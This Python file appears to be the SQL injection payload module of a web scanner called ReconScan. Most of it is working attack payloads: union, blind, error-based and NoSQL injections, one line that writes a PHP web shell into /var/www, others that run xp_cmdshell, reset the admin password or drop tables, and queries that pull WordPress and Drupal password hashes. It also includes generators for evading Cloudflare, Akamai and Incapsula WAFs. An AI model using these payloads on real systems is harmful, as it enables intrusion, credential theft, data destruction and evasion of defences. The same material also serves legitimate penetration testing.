"""
ReconScan SQL Injection Payload Library

Comprehensive SQL injection testing payloads from exploit databases.
Organized by database type and injection technique with advanced evasion capabilities.
"""

import random
import urllib.parse

class SQLInjectionPayloads:
    """Advanced SQL injection payload collection with context-aware generation and WAF evasion."""
    
    def __init__(self):
        """Initialize SQL injection payload sets with advanced capabilities."""
        
        # Basic SQL injection payloads
        self.basic_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
            "' OR 1=1#",
            "\" OR 1=1#",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "admin'--",
            "admin\"--",
            "admin'#",
            "admin\"#"
        ]
        
        # Union-based SQL injection payloads
        self.union_payloads = [
            "' UNION SELECT 1,2,3--",
            "\" UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "\" UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "\" UNION ALL SELECT 1,2,3--",
            "1' UNION SELECT user(),version(),database()--",
            "1\" UNION SELECT user(),version(),database()--",
            "' UNION SELECT @@version,@@user,@@database--",
            "\" UNION SELECT @@version,@@user,@@database--",
            "' UNION SELECT table_name FROM information_schema.tables--",
            "\" UNION SELECT table_name FROM information_schema.tables--"
        ]
        
        # Time-based blind SQL injection payloads
        self.time_based_payloads = [
            "'; WAITFOR DELAY '00:00:05'--",
            "\"; WAITFOR DELAY '00:00:05'--",
            "'; SELECT SLEEP(5)--",
            "\"; SELECT SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "\" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "'; IF(1=1) WAITFOR DELAY '00:00:05'--",
            "\"; IF(1=1) WAITFOR DELAY '00:00:05'--",
            "' OR IF(1=1,SLEEP(5),0)--",
            "\" OR IF(1=1,SLEEP(5),0)--",
            "'; DECLARE @x CHAR(9);SET @x=';WAITFOR DELAY ''00:00:05''';EXEC(@x)--",
            "1'; WAITFOR DELAY '00:00:05'--"
        ]
        
        # Boolean-based blind SQL injection payloads
        self.boolean_based_payloads = [
            "' AND 1=1--",
            "' AND 1=2--",
            "\" AND 1=1--",
            "\" AND 1=2--",
            "' AND 'a'='a",
            "' AND 'a'='b",
            "\" AND \"a\"=\"a",
            "\" AND \"a\"=\"b",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            "\" AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "\" AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        ]
        
        # Error-based SQL injection payloads
        self.error_based_payloads = [
            "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
            "\" AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
            "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
            "\" AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "\" AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXP(~(SELECT * FROM (SELECT database())a))--",
            "\" AND EXP(~(SELECT * FROM (SELECT database())a))--"
        ]
        
        # Advanced WAF evasion payload templates
        self.waf_evasion_templates = [
            # Case variation templates
            "{payload}",
            "{payload_upper}",
            "{payload_mixed}",
            
            # Comment insertion templates
            "{payload_comment_spaces}",
            "{payload_comment_inline}",
            "{payload_mysql_comments}",
            
            # Encoding templates
            "{payload_url_encoded}",
            "{payload_double_url_encoded}",
            "{payload_unicode_encoded}",
            "{payload_hex_encoded}",
            
            # Whitespace manipulation
            "{payload_tabs}",
            "{payload_newlines}",
            "{payload_mixed_whitespace}",
            
            # Keyword fragmentation
            "{payload_fragmented}",
            "{payload_concat_fragmented}"
        ]
        
        # Context-specific payload modifications
        self.context_modifiers = {
            'numeric': [
                lambda p: p.replace("'", "").replace('"', ""),  # Remove quotes for numeric context
                lambda p: f"1 {p.split(' ', 1)[1] if ' ' in p else p}",  # Adjust for numeric parameter
            ],
            'string': [
                lambda p: p,  # Keep as-is for string context
                lambda p: p.replace("--", "#") if "--" in p else p,  # Alternative comment style
            ],
            'search': [
                lambda p: p.replace("OR", "||"),  # Use || instead of OR
                lambda p: p.replace("AND", "&&"),  # Use && instead of AND
            ],
            'json': [
                lambda p: p.replace("'", '"'),  # Use double quotes for JSON
                lambda p: f'","injection":"{p}","continue":"',  # JSON injection format
            ]
        }
        
        # Initialize advanced payload components
        self._init_advanced_components()
    
    def _init_advanced_components(self):
        """Initialize advanced payload generation components."""
        
        # Database-specific payloads with better detection
        self.mysql_payloads = [
            "' AND @@version LIKE '5%'--",
            "\" AND @@version LIKE '5%'--",
            "' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT COUNT(*) FROM mysql.user)>0--",
            "' UNION SELECT user(),database(),version()--",
            "' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))--",
            "' AND UPDATEXML(0x0a,CONCAT(0x0a,(SELECT database())),0x0a)--"
        ]
        
        self.postgresql_payloads = [
            "' AND version() LIKE 'PostgreSQL%'--",
            "\" AND version() LIKE 'PostgreSQL%'--",
            "'; SELECT pg_sleep(5)--",
            "\"; SELECT pg_sleep(5)--",
            "' UNION SELECT version(),current_database(),current_user--",
            "' AND (SELECT COUNT(*) FROM pg_user)>0--",
            "' AND CAST((SELECT version()) AS int)--",
            "' AND CAST((SELECT current_database()) AS int)--"
        ]
        
        self.mssql_payloads = [
            "' AND @@version LIKE 'Microsoft%'--",
            "\" AND @@version LIKE 'Microsoft%'--",
            "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "\"; EXEC xp_cmdshell('ping 127.0.0.1')--",
            "' UNION SELECT @@version,@@servername,DB_NAME()--",
            "' AND (SELECT COUNT(*) FROM sys.databases)>0--",
            "' AND CONVERT(int,(SELECT @@version))--",
            "' AND CAST((SELECT @@version) AS int)--"
        ]
        
        self.oracle_payloads = [
            "' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--",
            "\" AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--",
            "' UNION SELECT banner,null FROM v$version WHERE rownum=1--",
            "' AND (SELECT COUNT(*) FROM all_users)>0--",
            "' AND CTXSYS.DRITHSX.SN(user,(CHR(39)||(SELECT user FROM dual)||CHR(39)))=1--",
            "' AND UTL_INADDR.get_host_name((SELECT user FROM dual))=1--"
        ]
        
        # NoSQL injection payloads (MongoDB, etc.)
        self.nosql_payloads = [
            "'; return true; var x='",
            "\"; return true; var x=\"",
            "' || '1'=='1",
            "\" || \"1\"==\"1",
            "'; return this.a != 'b'; var y='",
            "admin'; return(true); var foo='bar",
            "' && this.password.match(/.*/)//+%00",
            "' && this.passwordzz.match(/./)//+%00",
            "admin'||'1'=='1'//",
            "admin'||'1'=='1'||'a'=='a",
            "1'; return 'a'=='a' && ''=='",
            "1\"; return 'a'=='a' && ''==\""
        ]
        
        # Second-order SQL injection payloads
        self.second_order_payloads = [
            "admin' UNION SELECT 1,2,'<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",
            "test'; INSERT INTO users(username,password) VALUES('admin2','password')--",
            "user'; UPDATE users SET password='newpass' WHERE username='admin'--",
            "data'; DROP TABLE temp_table--",
            "input'; CREATE TABLE test_table(id INT)--"
        ]
        
        # Advanced filter bypass payloads
        self.bypass_payloads = [
            "1'/**/OR/**/1=1--",
            "1\"/**/OR/**/1=1--",
            "1'%20OR%201=1--",
            "1\"%20OR%201=1--",
            "1'||'1'='1",
            "1\"||\"1\"=\"1",
            "1'+'OR'+'1'='1",
            "1\"+\"OR\"+\"1\"=\"1",
            "1' OR 1=1%00",
            "1\" OR 1=1%00",
            "1'/*comment*/OR/*comment*/1=1--",
            "1\"%2f%2a%2aOR%2f%2a%2a1=1--",
            "1'oRdEr By 1--",
            "1\"oRdEr By 1--"
        ]
    
    def generate_context_aware_payloads(self, context_type='string', parameter_name='', response_hints=None):
        """
        Generate payloads tailored to specific contexts for better accuracy.
        
        Args:
            context_type (str): Type of context ('numeric', 'string', 'search', 'json')
            parameter_name (str): Name of the parameter being tested
            response_hints (dict): Hints about the application (framework, database, etc.)
            
        Returns:
            list: Context-aware payloads optimized for the given scenario
        """
        base_payloads = self.get_targeted_payloads('medium')
        context_payloads = []
        
        # Apply context-specific modifications
        if context_type in self.context_modifiers:
            for payload in base_payloads[:10]:  # Limit for performance
                for modifier in self.context_modifiers[context_type]:
                    try:
                        modified_payload = modifier(payload)
                        if modified_payload not in context_payloads:
                            context_payloads.append(modified_payload)
                    except Exception:
                        continue  # Skip failed modifications
        
        # Add parameter-specific payloads
        if parameter_name:
            context_payloads.extend(self._get_parameter_specific_payloads(parameter_name))
        
        # Add response-hint based payloads
        if response_hints:
            context_payloads.extend(self._get_response_based_payloads(response_hints))
        
        return context_payloads[:15]  # Return top 15 for efficiency
    
    def generate_waf_evasion_payloads(self, base_payload, waf_type='generic'):
        """
        Generate WAF evasion variants of a base payload.
        
        Args:
            base_payload (str): Original payload to create evasions for
            waf_type (str): Type of WAF detected ('cloudflare', 'akamai', 'generic')
            
        Returns:
            list: WAF evasion payload variants
        """
        evasion_payloads = []
        
        # Case variation evasions
        evasion_payloads.extend(self._generate_case_variations(base_payload))
        
        # Comment insertion evasions
        evasion_payloads.extend(self._generate_comment_variations(base_payload))
        
        # Encoding evasions
        evasion_payloads.extend(self._generate_encoding_variations(base_payload))
        
        # Whitespace manipulation evasions
        evasion_payloads.extend(self._generate_whitespace_variations(base_payload))
        
        # Keyword fragmentation evasions
        evasion_payloads.extend(self._generate_fragmentation_variations(base_payload))
        
        # WAF-specific evasions
        if waf_type != 'generic':
            evasion_payloads.extend(self._generate_waf_specific_evasions(base_payload, waf_type))
        
        return list(set(evasion_payloads))  # Remove duplicates
    
    def _generate_case_variations(self, payload):
        """Generate case variation evasions."""
        variations = []
        
        # Random case variation
        case_varied = ''.join(
            char.upper() if random.choice([True, False]) else char.lower()
            for char in payload if char.isalpha()
        )
        variations.append(case_varied)
        
        # Alternate case (every other character)
        alternate_case = ''.join(
            char.upper() if i % 2 == 0 else char.lower()
            for i, char in enumerate(payload)
        )
        variations.append(alternate_case)
        
        # First letter uppercase for each word
        title_case = payload.title()
        variations.append(title_case)
        
        return variations
    
    def _generate_comment_variations(self, payload):
        """Generate comment insertion evasions."""
        variations = []
        
        # MySQL style comments
        mysql_commented = payload.replace(' ', '/**/')
        variations.append(mysql_commented)
        
        # Inline comments with spaces
        space_commented = payload.replace(' ', ' /**/ ')
        variations.append(space_commented)
        
        # Comments between keywords
        if 'UNION' in payload.upper():
            union_commented = payload.replace('UNION', 'UNI/**/ON')
            variations.append(union_commented)
        
        if 'SELECT' in payload.upper():
            select_commented = payload.replace('SELECT', 'SEL/**/ECT')
            variations.append(select_commented)
        
        return variations
    
    def _generate_encoding_variations(self, payload):
        """Generate encoding evasions."""
        variations = []
        
        # URL encoding
        url_encoded = urllib.parse.quote(payload)
        variations.append(url_encoded)
        
        # Double URL encoding
        double_encoded = urllib.parse.quote(url_encoded)
        variations.append(double_encoded)
        
        # Hex encoding for specific characters
        hex_encoded = payload.replace("'", "%27").replace('"', "%22").replace(' ', "%20")
        variations.append(hex_encoded)
        
        # Unicode encoding
        unicode_encoded = payload.replace("'", "\u0027").replace('"', "\u0022")
        variations.append(unicode_encoded)
        
        return variations
    
    def _generate_whitespace_variations(self, payload):
        """Generate whitespace manipulation evasions."""
        variations = []
        
        # Tab replacement
        tab_version = payload.replace(' ', '\t')
        variations.append(tab_version)
        
        # Newline replacement
        newline_version = payload.replace(' ', '\n')
        variations.append(newline_version)
        
        # Mixed whitespace
        mixed_ws = payload.replace(' ', random.choice([' ', '\t', '\n']))
        variations.append(mixed_ws)
        
        # Multiple spaces
        multi_space = payload.replace(' ', '  ')
        variations.append(multi_space)
        
        return variations
    
    def _generate_fragmentation_variations(self, payload):
        """Generate keyword fragmentation evasions."""
        variations = []
        
        # SQL keyword fragmentation
        keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'ORDER', 'GROUP']
        
        for keyword in keywords:
            if keyword in payload.upper():
                # Split keyword with comments
                fragmented = payload.replace(keyword, f"{keyword[:3]}/**/{keyword[3:]}")
                variations.append(fragmented)
                
                # Split with plus signs (for some contexts)
                plus_fragmented = payload.replace(keyword, f"{keyword[:3]}+{keyword[3:]}")
                variations.append(plus_fragmented)
        
        return variations
    
    def _generate_waf_specific_evasions(self, payload, waf_type):
        """Generate WAF-specific evasion techniques."""
        variations = []
        
        if waf_type.lower() == 'cloudflare':
            # Cloudflare-specific bypasses
            cf_bypass = payload.replace("'", "'\x00").replace('"', '"\x00')
            variations.append(cf_bypass)
            
            # Alternative operators
            cf_alt = payload.replace('OR', '||').replace('AND', '&&')
            variations.append(cf_alt)
        
        elif waf_type.lower() == 'akamai':
            # Akamai-specific bypasses
            akamai_bypass = payload.replace(' ', '\x09')  # Tab character
            variations.append(akamai_bypass)
        
        elif waf_type.lower() == 'incapsula':
            # Incapsula-specific bypasses
            incap_bypass = payload.replace('UNION', 'UNION ALL')
            variations.append(incap_bypass)
        
        return variations
    
    def _get_parameter_specific_payloads(self, parameter_name):
        """Get payloads specific to parameter names."""
        param_specific = []
        param_lower = parameter_name.lower()
        
        # ID parameters often numeric
        if param_lower in ['id', 'uid', 'user_id', 'product_id', 'page_id']:
            param_specific.extend([
                "1 OR 1=1",
                "1 UNION SELECT 1,2,3",
                "1' OR '1'='1",
                "1) OR (1=1",
                "1)) OR ((1=1"
            ])
        
        # Search parameters
        elif param_lower in ['search', 'q', 'query', 'keyword']:
            param_specific.extend([
                "search' OR '1'='1",
                'search" OR "1"="1',
                "search') OR ('1'='1",
                "search%' OR '%'='%"
            ])
        
        # Login parameters
        elif param_lower in ['username', 'user', 'login', 'email']:
            param_specific.extend([
                "admin'--",
                'admin"--',
                "admin' OR '1'='1'--",
                "admin') OR ('1'='1'--"
            ])
        
        return param_specific
    
    def _get_response_based_payloads(self, response_hints):
        """Get payloads based on response analysis hints."""
        response_payloads = []
        
        # Database-specific payloads based on detected DB
        if 'database' in response_hints:
            db_type = response_hints['database'].lower()
            if db_type == 'mysql':
                response_payloads.extend(self.mysql_payloads[:5])
            elif db_type == 'postgresql':
                response_payloads.extend(self.postgresql_payloads[:5])
            elif db_type == 'mssql':
                response_payloads.extend(self.mssql_payloads[:5])
            elif db_type == 'oracle':
                response_payloads.extend(self.oracle_payloads[:5])
        
        # Framework-specific payloads
        if 'framework' in response_hints:
            framework = response_hints['framework'].lower()
            if 'wordpress' in framework:
                response_payloads.extend([
                    "' UNION SELECT wp_users.user_login, wp_users.user_pass FROM wp_users--",
                    "' AND (SELECT COUNT(*) FROM wp_users)>0--"
                ])
            elif 'drupal' in framework:
                response_payloads.extend([
                    "' UNION SELECT users.name, users.pass FROM users--",
                    "' AND (SELECT COUNT(*) FROM users)>0--"
                ])
        
        return response_payloads
    
    def get_basic_payloads(self):
        """Get basic SQL injection testing payloads."""
        return self.basic_payloads
    
    def get_union_payloads(self):
        """Get union-based SQL injection payloads."""
        return self.union_payloads
    
    def get_time_based_payloads(self):
        """Get time-based blind SQL injection payloads."""
        return self.time_based_payloads
    
    def get_boolean_based_payloads(self):
        """Get boolean-based blind SQL injection payloads."""
        return self.boolean_based_payloads
    
    def get_error_based_payloads(self):
        """Get error-based SQL injection payloads."""
        return self.error_based_payloads
    
    def get_database_specific_payloads(self, database_type='mysql'):
        """Get database-specific payloads."""
        if database_type.lower() == 'mysql':
            return self.mysql_payloads
        elif database_type.lower() == 'postgresql':
            return self.postgresql_payloads
        elif database_type.lower() == 'mssql':
            return self.mssql_payloads
        elif database_type.lower() == 'oracle':
            return self.oracle_payloads
        else:
            return self.mysql_payloads  # Default to MySQL
    
    def get_nosql_payloads(self):
        """Get NoSQL injection payloads."""
        return self.nosql_payloads
    
    def get_second_order_payloads(self):
        """Get second-order SQL injection payloads."""
        return self.second_order_payloads
    
    def get_bypass_payloads(self):
        """Get filter bypass payloads."""
        return self.bypass_payloads
    
    def get_all_payloads(self):
        """Get comprehensive list of all SQL injection payloads."""
        all_payloads = []
        all_payloads.extend(self.basic_payloads)
        all_payloads.extend(self.union_payloads)
        all_payloads.extend(self.time_based_payloads)
        all_payloads.extend(self.boolean_based_payloads)
        all_payloads.extend(self.error_based_payloads)
        all_payloads.extend(self.mysql_payloads)
        all_payloads.extend(self.postgresql_payloads)
        all_payloads.extend(self.mssql_payloads)
        all_payloads.extend(self.oracle_payloads)
        all_payloads.extend(self.nosql_payloads)
        all_payloads.extend(self.second_order_payloads)
        all_payloads.extend(self.bypass_payloads)
        
        return list(set(all_payloads))  # Remove duplicates
    
    def get_targeted_payloads(self, severity='medium', database_type='mysql'):
        """Get payloads based on severity/depth of testing."""
        if severity == 'low':
            return self.basic_payloads[:10]
        elif severity == 'medium':
            payloads = []
            payloads.extend(self.basic_payloads)
            payloads.extend(self.union_payloads[:10])
            payloads.extend(self.time_based_payloads[:5])
            payloads.extend(self.get_database_specific_payloads(database_type)[:5])
            return payloads
        elif severity == 'high':
            return self.get_all_payloads()
        else:
            return self.basic_payloads
    
    @staticmethod
    def get_common_parameters():
        """Get common parameter names for SQL injection testing."""
        return [
            'id', 'user_id', 'username', 'user', 'uid', 'userid', 'login',
            'email', 'password', 'pass', 'pwd', 'search', 'query', 'q',
            'name', 'category', 'cat', 'type', 'sort', 'order', 'orderby',
            'page', 'limit', 'offset', 'start', 'end', 'from', 'to',
            'item_id', 'product_id', 'article_id', 'post_id', 'comment_id',
            'session_id', 'token', 'key', 'value', 'data', 'content'
        ] 